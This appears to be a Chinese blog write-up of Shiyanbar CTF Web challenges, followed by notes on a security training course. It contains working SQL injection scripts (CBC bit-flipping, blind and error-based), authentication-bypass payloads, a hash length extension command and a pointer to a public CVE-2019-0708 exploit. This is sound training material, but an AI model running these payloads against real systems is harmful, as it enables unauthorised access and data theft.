Form\u0026lt;/h1\u0026gt; \u0026lt;span\u0026gt;input id to login\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;id\u0026#34;type=\u0026#34;text\u0026#34;class=\u0026#34;input id\u0026#34;value=\u0026#34;id\u0026#34;onfocus=\u0026#34;this.value=\\\u0026#39;\\\u0026#39;\u0026#34;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;footer\u0026#34;\u0026gt; \u0026lt;p\u0026gt;\u0026lt;input type=\u0026#34;submit\u0026#34;name=\u0026#34;submit\u0026#34;value=\u0026#34;Login\u0026#34;class=\u0026#34;button\u0026#34;/\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt;\u0026#39;; } } 首先会对提交的参数 id 进行过滤防止 SQL 注入，随后会随机生成一个 iv，并根据序列化后的 id 生成明文并加密，加密方式为 aes-128-cbc。容易想到 CBC 字节翻转攻击。iv 和 cipher 这里都经过了 base64 编码。\n如果没有提交参数 id，则执行与上述过程相反的解密过程得到明文。如果得到的明文无法反序列化，将直接返回其 base64；否则进行 sql 查询：\nselect * from users limit ?,0 这里的问号显然就是注入点了。尝试构造：\nselect * from users limit 1#,0 但是 # 和 -- 两种注释符被过滤了，考虑使用 %00。先提交：\nid=1;%00 得到 iv 和 cipher，然后设置到 cookie 里并去掉参数 id 再次提交，显示 Hello!rootzz，说明注入成功。\n这同时也说明，我们可以通过修改 iv 和 cipher 控制 id，而 iv 和 cipher 是没有过滤的，所以可以成功绕过 id 的过滤机制。具体如何修改，也就是 CBC 字节翻转攻击的具体过程可以参考 我的这篇博客 中的最后一题。\n例如，我们提交 id=12，序列化后分组如下：\nBlock 0: a:1:{s:2:\u0026#34;id\u0026#34;;s: Block 1: 2:\u0026#34;12\u0026#34;;} 可以看到，我们翻转第 0 组的第 4 字节（从 0 开始计数），即可控制 id=12 中的 2 了。再比如，我们提交 id=0 2nion select * from ((select 1)a join (select 2)b join (select 3)c);（显然这里我们可以用 join 替换逗号，并且想把 2 换成 u 来绕过检测），序列化后分组如下：\nBlock 0: a:1:{s:2:\u0026#34;id\u0026#34;;s: Block 1: 70:\u0026#34;0 2nion sele Block 2: ct * from ((sele Block 3: ct 1)a join (sel Block 4: ect 2)b join (se Block 5: lect 3)c); 这里要翻转的变成了第 6 字节，而如果 payload 长度大于等于 100，则需要翻转第 7 字节了。\n此外，需要注意在 payload 末尾添加 %00。如果直接添加可能会被二次 URL 编码，因此可以用 chr(0) 来添加。完整脚本：\nimport base64 import urllib import requests import re def login(payload, i, old, new): url = r\u0026#39;http://ctf5.shiyanbar.com/web/jiandan/index.php\u0026#39; data = {\u0026#39;id\u0026#39;: payload} r = requests.post(url=url, data=data) sc = r.headers[\u0026#39;Set-Cookie\u0026#39;] cipher = re.findall(r\u0026#39;cipher=(.*)\u0026#39;, sc)[0] iv = re.findall(r\u0026#39;iv=(.*),\u0026#39;, sc)[0] # print(cipher) # print(iv) cd = base64.b64decode(urllib.parse.unquote(cipher)) ivd = base64.b64decode(urllib.parse.unquote(iv)) ch = bytes([cd[i] ^ ord(new) ^ ord(old)]) cd = cd[:i] + ch + cd[i+1:] cnew = urllib.parse.quote(base64.b64encode(cd)) # print(cnew) cookie0 = {\u0026#39;iv\u0026#39;: iv, \u0026#39;cipher\u0026#39;: cnew} r = requests.post(url=url, cookies=cookie0) plain = re.findall(r\u0026#34;base64_decode\\(\u0026#39;(.*)\u0026#39;\\)\u0026#34;, r.text)[0] pd = base64.b64decode(plain) block0 = \u0026#39;a:1:{s:2:\u0026#34;id\u0026#34;;s:\u0026#39; for i in range(16): ch = bytes([ivd[i] ^ pd[i] ^ ord(block0[i])]) # Using bytes([int]) here is important ivd = ivd[:i] + ch + ivd[i+1:] ivnew = urllib.parse.quote(base64.b64encode(ivd)) # print(ivnew) cookie1 = {\u0026#39;iv\u0026#39;: ivnew, \u0026#39;cipher\u0026#39;: cnew} r = requests.post(url=url, cookies=cookie1) print(r.text) # login(\u0026#39;12\u0026#39;, 4, \u0026#39;#\u0026#39;, \u0026#39;2\u0026#39;) # login(\u0026#39;0 2nion select * from ((select 1)a join (select 2)b join (select 3)c);\u0026#39;+ chr(0), 6, \u0026#39;2\u0026#39;, \u0026#39;u\u0026#39;) login(\u0026#39;0 2nion select * from ((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);\u0026#39;+ chr(0), 7, \u0026#39;2\u0026#39;, \u0026#39;u\u0026#39;) # users, you_want login(\u0026#39;0 2nion select * from ((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp \u0026#34;you_want\u0026#34;)b join (select 3)c);\u0026#39;+ chr(0), 7, \u0026#39;2\u0026#39;, \u0026#39;u\u0026#39;) # value login(\u0026#39;0 2nion select * from ((select 1)a join (select value from you_want)b join (select 3)c);\u0026#39;+ chr(0), 6, \u0026#39;2\u0026#39;, \u0026#39;u\u0026#39;) 忘了提及的一点是，过滤了等号，可以通过 regexp 绕过。\n这题放在 Web 第一题实在是太劝退了。\n后台登录 # F12 找到：\n$password=$_POST[\u0026#39;password\u0026#39;]; $sql = \u0026#34;SELECT * FROM admin WHERE username =\u0026#39;admin\u0026#39;and password =\u0026#39;\u0026#34;.md5($password,true).\u0026#34;\u0026#39;\u0026#34;; $result=mysqli_query($link,$sql); if(mysqli_num_rows($result)\u0026gt;0){ echo \u0026#39;flag is :\u0026#39;.$flag; } else{ echo \u0026#39;密码错误!\u0026#39;; } 这里比较有意思的是在 SQL 注入中引入了哈希函数。其中 md5($password, true) 返回一个字符串。\n因此我们需要构造一个字符串，使得其 md5 值由 16 进制转为字符串后，包含 'or'num（num 为任意数字），这样就可以组成 SQL 语句：\nand password = \u0026#39;\u0026#39;or\u0026#39;num\u0026#39; 例如，对于字符串 ffifdyop，其 md5 值为 276f722736c95d99e921722cf9ed621c，对应字符串开头为 'or'6，因此 SQL 语句执行结果为 true，成功登录。\n加了料的报错注入 # 这题比较有趣的是，username 中过滤了 ()，而 password 中过滤了很多报错注入用的函数名。因此可以考虑将两者拼接，在 username 中使用函数但把 () 移动到 password 里，最后注释掉中间的 SQL 语句。此外，password 还过滤了 =，用双重否定绕过即可。\nusername=\u0026#39;and updatexml/*\u0026amp;password=*/(1,concat(0x7e,(select database()),0x7e),1) or \u0026#39;1 # XPATH syntax error: \u0026#39;~error_based_hpf~\u0026#39; username=\u0026#39;and updatexml/*\u0026amp;password=*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where !(table_schema\u0026lt;\u0026gt;\u0026#39;error_based_hpf\u0026#39;)),0x7e),1) or \u0026#39;1 # XPATH syntax error: \u0026#39;~ffll44jj,users~\u0026#39; username=\u0026#39;and updatexml/*\u0026amp;password=*/(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where !(table_name\u0026lt;\u0026gt;\u0026#39;ffll44jj\u0026#39;)),0x7e),1) or \u0026#39;1 # XPATH syntax error: \u0026#39;~value~\u0026#39; username=\u0026#39;and updatexml/*\u0026amp;password=*/(1,concat(0x7e,(select value from ffll44jj),0x7e),1) or \u0026#39;1 # XPATH syntax error: \u0026#39;~flag{err0r_b4sed_sqli_+_hpf}~\u0026#39; 另外，本题也可以用 exp 和 extractvalue 函数。\n认真一点！ # 过滤了 and，union，空格，逗号等等，or 需要双写绕过。之后进行布尔盲注。 爆数据库名长度：\nimport requests success = \u0026#39;You are in\u0026#39; url = \u0026#39;http://ctf5.shiyanbar.com/web/earnest/index.php\u0026#39; for i in range(1, 30): data = {\u0026#39;id\u0026#39;:\u0026#34;0\u0026#39;oorr(length(database())=%s)oorr\u0026#39;0\u0026#34; % i} print(data) r = requests.post(url, data=data) if success in r.text: print(\u0026#39;Finished, len = %s\u0026#39; % i) break 得到数据库名长度为 18。爆数据库名：\nimport requests import string success = \u0026#39;You are in\u0026#39; url = \u0026#39;http://ctf5.shiyanbar.com/web/earnest/index.php\u0026#39; chrset = string.digits + string.ascii_lowercase + \u0026#39;_!~\u0026#39; db = \u0026#39;\u0026#39; for i in range(1, 19): for j in chrset: data = {\u0026#39;id\u0026#39;:\u0026#34;0\u0026#39;oorr(mid(database()from(%s)foorr(1))=\u0026#39;%s\u0026#39;)oorr\u0026#39;0\u0026#34; % (i,j)} print(data) r = requests.post(url, data=data) if success in r.text: db += j print(db) break 得到数据库名 ctf_sql_bool_blind。爆表名长度：\nimport requests import string success = \u0026#39;You are in\u0026#39; url = \u0026#39;http://ctf5.shiyanbar.com/web/earnest/index.php\u0026#39; chrset = string.digits + string.ascii_lowercase + \u0026#39;_!~\u0026#39; i = 1 while True: val = \u0026#34;0\u0026#39;oorr((select(mid(group_concat(table_name separatoorr\u0026#39;@\u0026#39;)from(%s)foorr(1)))from(infoorrmation_schema.tables)where(table_schema)=database())=\u0026#39;\u0026#39;)oorr\u0026#39;0\u0026#34; % i data = {\u0026#39;id\u0026#39;: val.replace(\u0026#39;\u0026#39;, chr(0x0a))} print(data) r = requests.post(url, data=data) if success in r.text: print(\u0026#39;Finished, len = %s\u0026#39; % i) break i += 1 得到所有表名连接起来后，包含分隔符 @ 的总长为 10。爆表名：\nimport requests import string success = \u0026#39;You are in\u0026#39; url = \u0026#39;http://ctf5.shiyanbar.com/web/earnest/index.php\u0026#39; chrset = string.digits + string.ascii_lowercase + \u0026#39;_!~@\u0026#39; table = \u0026#39;\u0026#39; for i in range(1, 12): for j in chrset: val = \u0026#34;0\u0026#39;oorr((select(mid(group_concat(table_name separatoorr\u0026#39;@\u0026#39;)from(%s)foorr(1)))from(infoorrmation_schema.tables)where(table_schema)=database())=\u0026#39;%s\u0026#39;)oorr\u0026#39;0\u0026#34; % (i, j) data = {\u0026#39;id\u0026#39;: val.replace(\u0026#39;\u0026#39;, chr(0x0a))} print(data) r = requests.post(url, data=data) if success in r.text: table += j print(table) break 得到表名 fiag 和 users，显然前者是我们需要的。用同样的方法爆列名长度和列名 fl$4g。最后爆 flag 内容的长度：\nimport requests import string success = \u0026#39;You are in\u0026#39; url = \u0026#39;http://ctf5.shiyanbar.com/web/earnest/index.php\u0026#39; chrset = string.digits + string.ascii_lowercase + r\u0026#39;_~=+-*/{\\}?!:@#$%\u0026amp;()[],.\u0026#39; i = 1 while True: val = \u0026#34;0\u0026#39;oorr((select(mid((fl$4g)from(%s)foorr(1)))from(fiag))=\u0026#39;\u0026#39;)oorr\u0026#39;0\u0026#34; % i data = {\u0026#39;id\u0026#39;: val.replace(\u0026#39;\u0026#39;, chr(0x0a))} print(data) r = requests.post(url, data=data) if success in r.text: print(\u0026#39;Finished, len = %s\u0026#39; % i) break i += 1 得长度为 13，爆 flag 内容：\nimport requests import string success = \u0026#39;You are in\u0026#39; url = \u0026#39;http://ctf5.shiyanbar.com/web/earnest/index.php\u0026#39; chrset = string.digits + string.ascii_lowercase + r\u0026#39;_~=+-*/{\\}?!:@#$%\u0026amp;()[],.\u0026#39; flag = \u0026#39;\u0026#39; for i in range(1, 14): for j in chrset: val = \u0026#34;0\u0026#39;oorr((select(mid((fl$4g)from(%s)foorr(1)))from(fiag))=\u0026#39;%s\u0026#39;)oorr\u0026#39;0\u0026#34; % (i, j) data = {\u0026#39;id\u0026#39;: val.replace(\u0026#39;\u0026#39;, chr(0x0a))} print(data) r = requests.post(url, data=data) if success in r.text: flag += j print(flag) break 得到 flag{haha~you，很明显并不完整。将数字改大后再跑一次，得到 flag{haha~you-win}----，注意到右花括号后面是若干个 -，应该忽略。提交后发现答案错误。\n这时候就需要考虑右花括号后面全都是 - 的原因了。我们构造的 payload，简化后写出来就是：\n\u0026#34;0\u0026#39; or (select mid(fl$4g from(i) for(1)) from fiag) = \u0026#39;-\u0026#39; or \u0026#39;0 其中 i 是数字，表示 fl$4g 的第 i 个字符。当显示 You are in 时停止，也就是说此时，下面这个值为 True：\n(select mid(fl$4g from(i) for(1)) from fiag) = \u0026#39;-\u0026#39; 当 i 大于等于 20 时，显然此时 fl$4g 这一列的对应内容已经为空了，但是却依然能等于 -。这说明服务端通过某种方式将空格转义成了 -。因此真正的 flag 应该进行反转义，得到 flag{haha~you win!}。\n你真的会 PHP 吗？ # 响应头中有提示 6c525af4059b4fe7d8c33a.txt，得到代码：\n\u0026lt;?php $info = \u0026#34;\u0026#34;; $req = []; $flag=\u0026#34;xxxxxxxxxx\u0026#34;; ini_set(\u0026#34;display_error\u0026#34;, false); error_reporting(0); if(!isset($_POST[\u0026#39;number\u0026#39;])){ header(\u0026#34;hint:6c525af4059b4fe7d8c33a.txt\u0026#34;); die(\u0026#34;have a fun!!\u0026#34;); } foreach([$_POST] as $global_var) { foreach($global_var as $key =\u0026gt; $value) { $value = trim($value); is_string($value) \u0026amp;\u0026amp; $req[$key] = addslashes($value); } } function is_palindrome_number($number) { $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i \u0026lt; $j) { if($number[$i] !== $number[$j]) { return false; } $i++; $j--; } return true; } if(is_numeric($_REQUEST[\u0026#39;number\u0026#39;])){ $info=\u0026#34;sorry, you cann\u0026#39;t input a number!\u0026#34;; }elseif($req[\u0026#39;number\u0026#39;]!=strval(intval($req[\u0026#39;number\u0026#39;]))){ $info = \u0026#34;number must be equal to it\u0026#39;s integer!! \u0026#34;; }else{ $value1 = intval($req[\u0026#34;number\u0026#34;]); $value2 = intval(strrev($req[\u0026#34;number\u0026#34;])); if($value1!=$value2){ $info=\u0026#34;no, this is not a palindrome number!\u0026#34;; }else{ if(is_palindrome_number($req[\u0026#34;number\u0026#34;])){ $info = \u0026#34;nice! {$value1} is a palindrome number!\u0026#34;; }else{ $info=$flag; } } } echo $info; 随后就是源码审计了，number 不能为空且需要绕过 is_numeric，同时还不能是回文数，但是将这个数前后颠倒得到的数值应等于它本身。\n在 32 位系统上运行的 PHP 会把大于 2147483647 的数值认为是等于 2147483647 的，因此 2147483647 前后颠倒，对 PHP 来说其数值等于它本身。最后用 %00 绕过 is_numeric 即可，payload：2147483647%00。\n登陆一下好吗？？ # 能过滤的都过滤了，利用万能密码 '='。原理：\nwhere username = \u0026#39;\u0026#39;=\u0026#39;\u0026#39;and password =\u0026#39;\u0026#39;=\u0026#39;\u0026#39; 其中 username='' 结果为 false，这和空字符串被认为是相等的。\n因缺斯汀的绕过 # 参考博客，包含关于 rollup 的生动阐释\nF12 发现 source.txt：\n\u0026lt;?php error_reporting(0); if (!isset($_POST[\u0026#39;uname\u0026#39;]) || !isset($_POST[\u0026#39;pwd\u0026#39;])) { echo \u0026#39;\u0026lt;form action=\u0026#34;\u0026#34;method=\u0026#34;post\u0026#34;\u0026gt;\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;input name=\u0026#34;uname\u0026#34;type=\u0026#34;text\u0026#34;/\u0026gt;\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;input name=\u0026#34;pwd\u0026#34;type=\u0026#34;text\u0026#34;/\u0026gt;\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;input type=\u0026#34;submit\u0026#34;/\u0026gt;\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;/form\u0026gt;\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; echo \u0026#39;\u0026lt;!--source: source.txt--\u0026gt;\u0026#39;.\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;; die; } function AttackFilter($StrKey,$StrValue,$ArrReq){ if (is_array($StrValue)){ $StrValue=implode($StrValue); } if (preg_match(\u0026#34;/\u0026#34;.$ArrReq.\u0026#34;/is\u0026#34;,$StrValue)==1){ print \u0026#34;姘村彲杞借垷锛屼害鍙禌鑹囷紒\u0026#34;; exit(); } } $filter = \u0026#34;and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\u0026#34;; foreach($_POST as $key=\u0026gt;$value){ AttackFilter($key,$value,$filter); } $con = mysql_connect(\u0026#34;XXXXXX\u0026#34;,\u0026#34;XXXXXX\u0026#34;,\u0026#34;XXXXXX\u0026#34;); if (!$con){ die(\u0026#39;Could not connect:\u0026#39; . mysql_error()); } $db=\u0026#34;XXXXXX\u0026#34;; mysql_select_db($db, $con); $sql=\u0026#34;SELECT * FROM interest WHERE uname =\u0026#39;{$_POST[\u0026#39;uname\u0026#39;]}\u0026#39;\u0026#34;; $query = mysql_query($sql); if (mysql_num_rows($query) == 1) { $key = mysql_fetch_array($query); if($key[\u0026#39;pwd\u0026#39;] == $_POST[\u0026#39;pwd\u0026#39;]) { print \u0026#34;CTF{XXXXXX}\u0026#34;; }else{ print \u0026#34;浜﹀彲璧涜墖锛�\u0026#34;; } }else{ print \u0026#34;涓€棰楄禌鑹囷紒\u0026#34;; } mysql_close($con); ?\u0026gt; 可以看到过滤了很多注入关键字以及数组绕过等姿势，随后根据用户输入的 uname 去查询数据库中的 pwd，然后和用户 POST 的 pwd 比较，一致则通过。注意到这里也是一个弱等号，因此可以考虑空值绕过。还要注意查询输出的结果必须只有一行。\n先查看表里一共有几行数据：\n1\u0026#39; or 1 limit 1 offset 0# 1\u0026#39; or 1 limit 1 offset 1# 1\u0026#39; or 1 limit 1 offset 2# 前两条都返回 浜﹀彲璧涜墖锛�，而第三条返回 涓€棰楄禌鑹囷紒（这里的乱码是因为编码问题，懒得转换了），因此表里一共只有两条数据。那么怎么插入一条新的数据，使得其中的 pwd 为 NULL 呢？\n我们可以利用 rollup 统计功能实现。构造 payload：\n1\u0026#39; or 1 group by pwd with rollup limit 1 offset 2# 注意这里的顺序。先 group by pwd with rollup 插入一条 pwd 为 NULL 的统计数据，然后 limit 1 offset 2 取最新的这一条数据。此时，由于我们 POST 的 pwd 也是空，因此通过验证。\n简单的 sql 注入之 3/2/1 # 第三题 sqlmap 报错注入。\n第二题还是 sqlmap，不过由于过滤空格（和右括号）需要 --tamper=space2comment。\n不知道为什么第一题似乎和第二题一样。\n天下武功唯快不破 # import requests import base64 url = \u0026#39;http://ctf5.shiyanbar.com/web/10/10.php\u0026#39; response = requests.get(url) flag = base64.b64decode(response.headers[\u0026#39;FLAG\u0026#39;]).decode().split(\u0026#39;:\u0026#39;)[1] data = {\u0026#39;key\u0026#39;: flag} res = requests.post(url=url, data=data) print(res.text) 让我进去 # 抓包发现 cookie 中存在 source=0，改为 1 即可查看源码：\n$flag = \u0026#34;XXXXXXXXXXXXXXXXXXXXXXX\u0026#34;; $secret = \u0026#34;XXXXXXXXXXXXXXX\u0026#34;; // This secret is 15 characters long for security! $username = $_POST[\u0026#34;username\u0026#34;]; $password = $_POST[\u0026#34;password\u0026#34;]; if (!empty($_COOKIE[\u0026#34;getmein\u0026#34;])) { if (urldecode($username) === \u0026#34;admin\u0026#34; \u0026amp;\u0026amp; urldecode($password) != \u0026#34;admin\u0026#34;) { if ($COOKIE[\u0026#34;getmein\u0026#34;] === md5($secret . urldecode($username . $password))) { echo \u0026#34;Congratulations! You are a registered user.\\n\u0026#34;; die (\u0026#34;The flag is\u0026#34;. $flag); } else { die (\u0026#34;Your cookies don\u0026#39;t match up! STOP HACKING THIS SITE.\u0026#34;); } } else { die (\u0026#34;You are not an admin! LEAVE.\u0026#34;); } } setcookie(\u0026#34;sample-hash\u0026#34;, md5($secret . urldecode(\u0026#34;admin\u0026#34;.\u0026#34;admin\u0026#34;)), time() + (60 * 60 * 24 * 7)); if (empty($_COOKIE[\u0026#34;source\u0026#34;])) { setcookie(\u0026#34;source\u0026#34;, 0, time() + (60 * 60 * 24 * 7)); } else { if ($_COOKIE[\u0026#34;source\u0026#34;] != 0) { echo \u0026#34;\u0026#34;; // This source code is outputted here } } 可以看到，我们需要设置 cookie 中的 getmein 为 secret||username||password 的 MD5 值，其中 username 为 admin，password 不能为 admin，且 secret 未知，但长度为 15 字节。\n我们还知道，数据包中的 sample-hash 的值就是 secret||'admin'||'admin' 的 MD5 值，而这个值是已知的。因此，这显然是哈希长度扩展攻击的模板题。参考 哈希长度扩展攻击。具体命令：\n./hash_extender --data admin --secret 20 --append append --signature 571580b26c65f306376d4f64e53cb5c7 --format md5 注意这里 secret 长度为题目给出的 15 加上 admin 的长度 5，结果：\nType: md5 Secret length: 20 New signature: 83f2684d54049c211e191f27902caaaf New string: 61646d696e80000000000000000000000000000000000000000000000000000000000000c800000000000000617070656e64 因此在 cookie 中设置 getmein=83f2684d54049c211e191f27902caaaf，POST 数据为：\nusername=admin\u0026amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00append 发包后得到 flag。\n拐弯抹角 # 仔细读它给的注释，可以想到 index.php/index.php 的方式。\nForms # 抓包发现存在 showsource 参数，改成 1 就能看到源码，PIN 码被写死在代码里了。\n天网管理系统 # F12 看到登录判断代码，是需要用户名 md5 值为 0，任意选一个 md5 以 0e 开头的字符串就会被当作是 0 处理。登录后得到一个 url，访问得到：\n$unserialize_str = $_POST[\u0026#39;password\u0026#39;]; $data_unserialize = unserialize($unserialize_str); if($data_unserialize[\u0026#39;user\u0026#39;] ==\u0026#39;???\u0026#39;\u0026amp;\u0026amp; $data_unserialize[\u0026#39;pass\u0026#39;]==\u0026#39;???\u0026#39;) { print_r($flag); } 得到关于 password 的提示，这里利用弱等于漏洞，直接让 user 和 pass 都为 true 即可。payload:\nusername=admin\u0026amp;password=a:2:{s:4:\u0026#34;user\u0026#34;;b:1;s:4:\u0026#34;pass\u0026#34;;b:1;} 忘记密码了 # 随便填个邮箱地址，在源代码中发现这样两行：\n\u0026lt;meta name=\u0026#34;admin\u0026#34;content=\u0026#34;admin@simplexue.com\u0026#34;/\u0026gt; \u0026lt;meta name=\u0026#34;editor\u0026#34;content=\u0026#34;Vim\u0026#34;/\u0026gt; 第二行的 vim 一般指 Vim 编辑器，容易联想到它产生的备份文件 .swp，可能在网站目录下存在这类文件。而第一行的邮箱显然就是我们需要的管理员邮箱了。\n此外还能得到提示：下一步跳转到 step2.php，接收一个 email 参数和一个 check 参数。如果随意填写 check 参数则会显示 check error 然后返回 step1.php。\n抓包访问 step2.php，查看源码，注意到它会提交请求到 submit.php，而如果直接访问则会得到 you are not an admin。因此考虑获取三个页面中某一个的源码，尝试 .step1.php.swp 和 .step2.php.swp 无果，但是存在 .submit.php.swp。核心代码：\nif(!empty($token)\u0026amp;\u0026amp;!empty($emailAddress)){ if(strlen($token)!=10) die(\u0026#39;fail\u0026#39;); if($token!=\u0026#39;0\u0026#39;) die(\u0026#39;fail\u0026#39;); $sql = \u0026#34;SELECT count(*) as num from `user` where token=\u0026#39;$token\u0026#39; AND email=\u0026#39;$emailAddress\u0026#39;\u0026#34;; $r = mysql_query($sql) or die(\u0026#39;db error\u0026#39;); $r = mysql_fetch_assoc($r); $r = $r[\u0026#39;num\u0026#39;]; if($r\u0026gt;0){ echo $flag; }else{ echo \u0026#34;失败了呀\u0026#34;; } } 这里要求 token 长度为 10 且值等于 0，可以直接令其等于 0000000000（0e 绕过应该也行）。最终 payload：\nhttp://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin@simplexue.com\u0026amp;token=0000000000 Once More # 首先拿到源代码：\n\u0026lt;?php if (isset ($_GET[\u0026#39;password\u0026#39;])) { if (ereg (\u0026#34;^[a-zA-Z0-9]+$\u0026#34;, $_GET[\u0026#39;password\u0026#39;]) === FALSE) { echo \u0026#39;\u0026lt;p\u0026gt;You password must be alphanumeric\u0026lt;/p\u0026gt;\u0026#39;; } else if (strlen($_GET[\u0026#39;password\u0026#39;]) \u0026lt;8 \u0026amp;\u0026amp; $_GET[\u0026#39;password\u0026#39;]\u0026gt; 9999999) { if (strpos ($_GET[\u0026#39;password\u0026#39;],\u0026#39;*-*\u0026#39;) !== FALSE) { die(\u0026#39;Flag:\u0026#39; . $flag); } else { echo(\u0026#39;\u0026lt;p\u0026gt;*-* have not been found\u0026lt;/p\u0026gt;\u0026#39;); } } else { echo \u0026#39;\u0026lt;p\u0026gt;Invalid password\u0026lt;/p\u0026gt;\u0026#39;; } } ?\u0026gt; 代码先检查传入的密码是否是由字母和数字构成，然后限制了长度小于 8 但值大于 9999999，最后密码中需要含有 *-*。\n题目提示 ereg 函数存在漏洞，猜测这里是利用 %00 截断，构造 password=1e9%00*-* 即可绕过。需要注意的是，如果直接在输入框输入，%00 会被二次 URL 编码。\nGuessNextSession # 这题属于错误出题的典范，直接点 Guess 就可以出答案。。。为什么呢？还是先看源码：\n\u0026lt;?php session_start(); if (isset ($_GET[\u0026#39;password\u0026#39;])) { if ($_GET[\u0026#39;password\u0026#39;] == $_SESSION[\u0026#39;password\u0026#39;]) die (\u0026#39;Flag:\u0026#39;.$flag); else print \u0026#39;\u0026lt;p\u0026gt;Wrong guess.\u0026lt;/p\u0026gt;\u0026#39;; } mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000)); ?\u0026gt; 这里要求参数 password 和 session 中的 password 相同，而且是弱等号，所以当我们清空 cookie，什么都不填直接提交时，弱等号比较必定返回 true。\nFALSE # 数组绕过 SHA1 碰撞。\nNSCTF web200 # 根据加密函数写解密函数，这里感觉用 PHP 比用 Python 要简单一点：\n\u0026lt;?php function decode($str) { $_o = base64_decode(strrev(str_rot13($str))); $_ = \u0026#39;\u0026#39;; for ($_0 = 0; $_0 \u0026lt; strlen($_o); ++$_0) { $_c = substr($_o, $_0, 1); $__ = ord($_c) - 1; $_c = chr($__); $_ .= $_c; } return strrev($_); } echo decode(\u0026#39;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\u0026#39;); ?\u0026gt; 这里的技巧是 rot13 加密两次后会恢复出原来的明文，所以其解密和加密用的是同一个函数。\n程序逻辑问题 # F12 发现 index.txt，核心代码：\n\u0026lt;?php if($_POST[user] \u0026amp;\u0026amp; $_POST[pass]) { $conn = mysql_connect(\u0026#34;********\u0026#34;, \u0026#34;*****\u0026#34;, \u0026#34;********\u0026#34;); mysql_select_db(\u0026#34;phpformysql\u0026#34;) or die(\u0026#34;Could not select database\u0026#34;); if ($conn-\u0026gt;connect_error) { die(\u0026#34;Connection failed:\u0026#34; . mysql_error($conn)); } $user = $_POST[user]; $pass = md5($_POST[pass]); $sql = \u0026#34;select pw from php where user=\u0026#39;$user\u0026#39;\u0026#34;; $query = mysql_query($sql); if (!$query) { printf(\u0026#34;Error: %s\\n\u0026#34;, mysql_error($conn)); exit(); } $row = mysql_fetch_array($query, MYSQL_ASSOC); //echo $row[\u0026#34;pw\u0026#34;]; if (($row[pw]) \u0026amp;\u0026amp; (!strcasecmp($pass, $row[pw]))) { echo \u0026#34;\u0026lt;p\u0026gt;Logged in! Key:************** \u0026lt;/p\u0026gt;\u0026#34;; } else { echo(\u0026#34;\u0026lt;p\u0026gt;Log in failure!\u0026lt;/p\u0026gt;\u0026#34;); } } ?\u0026gt; 这里会将 pass 参数 MD5 后赋值给 pass 变量，但 username 没有过滤，存在注入。构造 payload：\nusername=-1\u0026#39;union select md5(1)#\u0026amp;password=1 使得 pass 的值经过 MD5 后与查询结果相同，即可登录。\nwhat a fuck! 这是什么鬼东西? # jsfuck 直接控制台运行。\nPHP 大法 # 根据提示拿到源码：\n\u0026lt;?php if(eregi(\u0026#34;hackerDJ\u0026#34;,$_GET[id])) { echo(\u0026#34;\u0026lt;p\u0026gt;not allowed!\u0026lt;/p\u0026gt;\u0026#34;); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == \u0026#34;hackerDJ\u0026#34;) { echo \u0026#34;\u0026lt;p\u0026gt;Access granted!\u0026lt;/p\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;p\u0026gt;flag: *****************} \u0026lt;/p\u0026gt;\u0026#34;; } ?\u0026gt; 二次 URL 编码绕过。\n貌似有点难 # XFF 头伪造 IP 为 1.1.1.1。\n头有点大 # 修改请求头中的 User-agent 和 Accept-Language：\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; .NET CLR 9.9) Accept-Language: en-gb,en;q=0.9 猫抓老鼠 # 抓包发现异常字段 Content-Row，长得像 base64 但并不需要解码，直接填在 pass_key 里提交就好。\n看起来有点难 # 这题如果不用 admin 登录，会显示数据库连接失败，看起来就像题被打了一样。\n所以跑 sqlmap 用的 url 中，用户名必须是 admin，比如 http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin\u0026amp;pass=admin\u0026amp;action=login。其它没有什么坑点。\n","date":"2019-07-26","permalink":"/posts/shiyanba-web/","section":"Posts","summary":"\u003cp\u003e实验吧的 Web 题总体比 Bugku 难一些，主要难度在于几道注入题。\u003c/p\u003e","title":"实验吧 Web 练习记录"},{"content":"7.22-7.26，收获不大。\nDay1 \u0026amp; Day2 # 概念介绍和比较基本的漏洞利用。\n可能需要补的东西 # 协议 \u0026amp; 路由相关知识：TCP/IP 卷一，CCNA/CCNP 学习指导 安全技能证书 PHP 代码审计工具 PHP SQL 工具的使用 …… CVE-2019-0708 # 获取脚本：https://www.exploit-db.com/exploits/46946，命名为 poc.py。\n在 Win7 靶机上开启 3389 端口（计算机-\u0026gt;属性-\u0026gt;远程设置-\u0026gt;允许所有...），并通过 ipconfig 查看 IP。\n最后终端运行：\n$ python poc.py [靶机 IP 靶机位数] 其中靶机 IP 为上面获得的 IP，靶机位数为 32 或 64。\n其余 CVE 利用过程都基于 MSF，比较套路。\nDay3 # Web 方向。\nLevel4 # 扫后台发现存在备份文件 